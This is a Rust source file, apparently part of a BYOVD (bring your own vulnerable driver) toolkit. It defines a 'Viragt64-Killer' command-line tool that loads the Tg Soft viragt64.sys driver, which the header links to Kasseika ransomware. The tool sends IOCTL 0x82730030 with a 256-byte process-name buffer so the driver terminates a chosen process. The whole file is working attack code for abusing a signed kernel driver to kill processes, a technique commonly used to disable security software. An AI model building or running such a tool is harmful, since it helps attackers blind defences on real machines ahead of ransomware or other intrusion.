use byovd_lib::{DriverConfig, Result};
use clap::Parser;

// ============================================================================
// Driver Configuration - viragt64.sys (Tg Soft / Kasseika Ransomware BYOVD)
// ============================================================================

struct Viragt64Driver;

impl DriverConfig for Viragt64Driver {
    fn driver_name(&self) -> &str {
        "viragt64"
    }

    fn driver_file(&self) -> &str {
        "viragt64.sys"
    }

    fn device_path(&self) -> &str {
        "\\\\.\\viragtlt"
    }

    fn ioctl_code(&self) -> u32 {
        0x82730030
    }

    /// Driver causes BSOD on unload - skip cleanup.
    fn skip_unload(&self) -> bool {
        true
    }

    fn build_ioctl_input(&self, _pid: u32, process_name: &str) -> Vec<u8> {
        // This driver takes a 256-byte buffer with the process name (ASCII).
        // The driver terminates the process by name, not by PID.
        let mut buf = vec![0u8; 256];
        let bytes = process_name.as_bytes();
        let len = bytes.len().min(255);
        buf[..len].copy_from_slice(&bytes[..len]);
        buf
    }

    fn ioctl_output_size(&self) -> usize {
        4
    }
}

// ============================================================================
// CLI
// ============================================================================

#[derive(Parser)]
#[command(name = "Viragt64-Killer", version, author = "BlackSnufkin")]
#[command(about = "BYOVD process killer using viragt64 driver (Tg Soft)")]
struct Cli {
    /// Target process name (e.g., notepad.exe)
    #[arg(short = 'n', long = "name", required = true)]
    process_name: String,
}

// ============================================================================
// Main
// ============================================================================

fn main() -> Result<()> {
    let cli = Cli::parse();
    byovd_lib::run(&Viragt64Driver, &cli.process_name, None)
}
